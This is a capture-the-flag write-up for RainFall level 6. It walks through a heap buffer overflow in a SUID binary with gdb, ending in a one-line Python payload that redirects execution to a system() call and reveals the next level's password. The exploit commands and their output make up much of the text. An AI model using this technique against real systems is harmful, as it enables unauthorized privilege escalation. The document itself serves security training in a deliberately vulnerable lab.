# Level 6

## Vulnerability

strcpy() heap overflow

## Context

We find a binary with owner level7 and SUID.
```
level6@RainFall:~$ ls -l
-rwsr-s---+ 1 level7 users 5274 Mar  6  2016 level6
```
It segfaults when run without arguments. It replies to random arguments with "Nope".
```
level6@RainFall:~$ ./level6
Segmentation fault (core dumped)
level6@RainFall:~$ ./level6 Would you like to be my friend?
Nope
```

## Solution

Investigating with gdb, we find the main calls function ```m``` which writes "Nope".
```
level6@RainFall:~$ gdb -q level6
...
(gdb) disas main
...
   0x080484a5 <+41>:	mov    $0x8048468,%edx        ; load address of function m
...
   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt> ; strcpy() argv[1] to 64 byte buffer
...
   0x080484d0 <+84>:	call   *%eax                  ; call function m
...
(gdb) disas m
...
   0x08048475 <+13>:	call   0x8048360 <puts@plt>   ; write "Nope"
```
But we also find a similar uncalled function ```n``` which calls ```system()```, opening a shell and showing the password.
```
(gdb) info functions
...
0x08048454  n
...
(gdb) disas n
...
   0x08048461 <+13>:	call   0x8048370 <system@plt>
```
strcpy() copies argv[1] to a 64 byte buffer on the heap.

Let's try to overflow this buffer and overwrite ```eip``` with the address of ```n```, thereby jump to executing ```n```.

### Find EIP offset

First, using the following example with [this EIP offset tool](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/), we find the EIP offset is 72.
```
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
...
0x41346341 in ?? ()
```

### Build exploit string

So we build our exploit string:
1. 72 bytes padding
2. address of ```n``` - "\x54\x84\x04\x08"

Then give the exploit string as argument to the binary
```
level6@RainFall:~$ ./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

## Recreate Exploited Binary

As user ```level7```, in ```/tmp```, create and compile ```level6_source.c```.
```
level7@RainFall:/tmp$ gcc level6_source.c -o level6_source
```
Edit permissions including suid, then move the binary to home directory.
```
level7@RainFall:/tmp$ chmod u+s level6_source; chmod +wx ~; mv level6_source ~
```
Exit back to user ```level6```, then run the source with an updated address of function ```n``` (found with gdb).
```
level7@RainFall:/tmp$ exit
exit
level6@RainFall:~$ /home/user/level7/level6_source $(python -c 'print "A" * 72 + "\x88\x84\x04\x08"')
```
